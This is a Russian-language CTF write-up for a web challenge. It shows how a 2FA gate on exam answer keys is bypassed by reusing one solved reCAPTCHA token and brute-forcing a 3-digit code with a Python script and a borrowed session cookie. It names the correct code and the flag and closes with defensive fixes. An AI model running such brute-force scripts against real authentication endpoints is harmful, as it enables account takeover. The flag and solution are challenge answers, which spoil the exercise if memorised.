## TL;DR

Доступ к эталонным ответам экзамена закрыт 2FA: 3-значный код + reCAPTCHA. Токен капчи сервер принимает многократно, а на код нет rate limit. Решаем капчу один раз в браузере, забираем токен из DevTools и брутфорсим 000–999. Код — 349, флаг приходит в ответе.

**Флаг:** `avito{0Tp_ch3ck3D_b3FORe_cAptcha_0oPS}`

## Steps

1. **Сессия профессора.** Работаем под аккаунтом `prof_barsukov` из таски «метро», куки `sopromed.sid` — из браузера. Целевая страница: `/teacher/tests/1/answers`, форма шлёт POST на `/api/teacher/tests/1/answers` с полями `token` (код) и `captcha`.

2. **Проверить капчу без токена.** Пустое поле `captcha` → `{"error":"captcha_required"}` — сервер хочет токен.

3. **Получить токен reCAPTCHA.** Открываем страницу в браузере, проходим «Я не робот», в консоли DevTools:

   ```javascript
   document.querySelector('textarea[name="g-recaptcha-response"]').value
   ```

4. **Брутфорс кода с одним токеном.**
   Полный скрипт в папке райтапа
   ```python
   import requests, time

   url = "https://sopromed-031nc82j.avitoctf.ru/api/teacher/tests/1/answers"
   cookies = {"sopromed.sid": "<сессия профессора>"}
   CAPTCHA = "<g-recaptcha-response>"

   for code in range(1000):
       code_str = f"{code:03d}"
       r = requests.post(url, cookies=cookies,
                         json={"token": code_str, "captcha": CAPTCHA})
       if "avito" in r.text.lower():
           print("FOUND", code_str); print(r.text); break
       time.sleep(0.03)
   ```

5. **Забрать флаг.** Правильный код — `349`; в ответе лежат эталонные ответы и поле `test.secret` с флагом.

## Why it works

- **Пространство кода крошечное.** 3 цифры = 1000 вариантов — перебор за минуты.
- **Токен капчи многоразовый.** reCAPTCHA-токены одноразовые по задумке Google, но здесь сервер не инвалидирует их после первого использования и, судя по поведению, не сверяет с Google вовсе — один решённый чекбокс открывает 1000 запросов.
- **Нет rate limit и блокировки.** Сервер отвечает на все попытки перебора одинаково быстро, без прогрессирующих задержек.
- **Флаг возвращается в теле ответа** успешного запроса — цель перебора однозначно детектируется по подстроке `avito`.

## Defense

- Проверять капчу **на стороне сервера** через API Google и инвалифицировать токен после первой же проверки: одноразовость должна обеспечиваться сервером, а не браузером.
- Rate limit на эндпоинт проверки 2FA: например, 5 попыток на аккаунт, дальше — пауза или блокировка с уведомлением.
- Делать код достаточной длины и энтропии (6+ цифр или TOTP) — 3 цифры перебираются тривиально.
- Не выдавать чувствительные данные (эталонные ответы) в ответе, который защищён только перебираемым кодом.
